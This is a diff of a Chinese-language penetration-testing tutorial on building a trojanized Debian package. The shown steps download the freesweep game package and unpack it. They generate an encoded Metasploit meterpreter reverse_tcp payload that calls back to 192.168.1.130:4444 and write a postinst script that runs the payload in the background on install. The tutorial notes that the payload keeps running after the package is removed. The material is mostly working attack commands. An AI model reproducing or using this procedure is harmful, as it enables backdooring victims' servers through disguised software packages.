@@ -10,15 +10,11 @@ tags: ['安全渗透']
 
 Metasploit制作恶意deb软件包获取服务器权限
 
-
-
 <!--more-->
 
 
 
 ## 实验步骤
-
-
 
 * 制作恶意软件包使用--download-only 方式下载freesweep软件包不进行安装 
 
@@ -34,14 +30,14 @@ Metasploit制作恶意deb软件包获取服务器权限
    mv /var/cache/apt/archives/freesweep_1.0.1-1_amd64.deb /
   ~~~
 
-* 解压freesweep软件包到free目录 
+*  解压freesweep软件包到free目录 
 
   ~~~
 cd /
 dpkg -x freesweep_1.0.1-1_amd64.deb free
   ~~~
 
-* 生成恶意代码到软件包源文件中
+*  生成恶意代码到软件包源文件中
 
   ~~~
   msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp -b "\x00" -i 10  -e x86/shikata_ga_nai  LHOST=192.168.1.130 LPORT=4444 | msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp -b "\x00" -i 10  -e x86/xor_dynamic | msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp -b "\x00" -i 10  -e x86/call4_dword_xor -f elf -o /free/usr/share/freesweep_source
@@ -58,7 +54,7 @@ dpkg -x freesweep_1.0.1-1_amd64.deb free
 * 创建软件包信息文件
 
 ~~~
-tee /free/control << 'EOF'
+tee /free/DEBIAN/control << 'EOF'
 Package: freesweep 
 Version: 0v1
 Section: Games and Amusement 
@@ -72,7 +68,7 @@ EOF
 * 创建deb软件包安装后脚本文件，加载后门 
 
 ~~~
-tee /free/postinst << 'EOF'
+tee /free/DEBIAN/postinst << 'EOF'
 sudo chmod 755 /usr/share/freesweep_source
 sudo /usr/share/freesweep_source &  
 EOF 
@@ -107,8 +103,6 @@ background
   ~~~
   dpkg -i free.deb 
   ~~~
-
-  
 
 * 目标机删除安装包和卸载软件包 # 恶意软件包被卸载，payload 依旧正常运行
 
